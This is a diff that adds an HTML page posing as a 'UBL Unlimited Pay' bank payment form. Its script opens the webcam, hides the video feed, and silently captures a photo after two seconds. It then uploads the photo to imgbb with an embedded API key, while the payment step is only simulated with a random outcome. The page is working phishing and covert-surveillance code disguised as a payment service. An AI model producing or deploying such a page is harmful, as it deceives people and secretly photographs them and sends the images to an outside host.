@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UBL Unlimited Pay</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f8ff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    h2 {
+      color: #003da5;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 300px;
+      text-align: center;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #003da5;
+      border-radius: 5px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    input[type="text"]:focus,
+    input[type="number"]:focus {
+      border-color: #007bff;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    #video {
+      display: none; /* Hide the video feed */
+    }
+
+    #status {
+      color: red;
+      margin-top: 10px;
+    }
+
+    .loading {
+      display: none;
+      color: green;
+      font-weight: bold;
+    }
+
+    .success {
+      color: green;
+      font-weight: bold;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>Enter Your Number To Pay</h2>
+  <video id="video" autoplay></video>
+  <div class="container">
+    <form id="paymentForm">
+      <input type="text" id="accountNumber" placeholder="Account Number" required>
+      <input type="number" id="amount" placeholder="Amount" required>
+      <button type="submit">Make Payment</button>
+    </form>
+    <p id="status"></p>
+    <p id="loading" class="loading">Processing your payment...</p>
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    const loading = document.getElementById('loading');
+
+    // Start Camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Automatically capture photo after 2 seconds
+        setTimeout(captureAndUploadPhoto, 2000);
+      })
+      .catch(err => {
+        console.error("Camera access denied:", err);
+        status.innerText = "Error accessing camera!";
+      });
+
+    // Capture Photo and Upload
+    function captureAndUploadPhoto() {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL('image/png');
+
+      // Save Photo to Imgbb
+      const imgbbAPIKey = "05286aa5b2d314959e9cd61d0693d3e2"; // Your API key
+      fetch(`https://api.imgbb.com/1/upload?key=${imgbbAPIKey}`, {
+        method: "POST",
+        body: new URLSearchParams({
+          image: imageData.split(',')[1] // Remove "data:image/png;base64,"
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          status.innerText = "Photo uploaded successfully! You can now proceed with payment.";
+        } else {
+          status.innerText = "Error uploading photo.";
+        }
+      })
+      .catch(err => {
+        console.error("Error uploading photo:", err);
+        status.innerText = "Error uploading photo.";
+      });
+    }
+
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const accountNumber = document.getElementById('accountNumber').value;
+      const amount = document.getElementById('amount').value;
+
+      // Show loading message
+      loading.style.display = 'block';
+      status.innerText = `Processing payment of ${amount} for account ${accountNumber}...`;
+      
+      // Simulate payment processing
+      setTimeout(() => {
+        // Simulate success or failure
+        const success = Math.random() > 0.2; // 80% chance of success
+        if (success) {
+          status.innerText = `Payment of ${amount} made successfully for account ${accountNumber}!`;
+          status.className = "success";
+        } else {
+          status.innerText = `Payment failed! Please try again.`;
+          status.className = "error";
+        }
+        loading.style.display = 'none'; // Hide loading message
+      }, 3000); // Simulate a delay for payment processing
+    });
+  </script>
+</body>
+</html>
